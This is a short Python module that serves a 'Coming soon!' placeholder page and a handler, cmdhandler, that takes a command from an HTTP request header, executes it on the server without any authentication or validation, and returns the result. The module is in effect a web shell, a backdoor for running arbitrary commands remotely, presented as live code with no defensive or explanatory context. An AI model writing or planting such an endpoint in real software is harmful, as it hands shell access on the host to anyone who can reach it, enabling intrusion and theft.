import logging

from src.utils.tools import (
    run_cmd,
    get_http_header,
)

LOG = logging.getLogger(__name__)


def wsgi_root(*args):
    return 'Coming soon!'


def cmdhandler(event):
    http_info = get_http_header(event)
    cmd = http_info.get('cmd')
    if not cmd:
        return 'err: cmd is "None"!\n'

    res = run_cmd(cmd)
    LOG.info(f'run cmd: {cmd}, {res}')
    return res
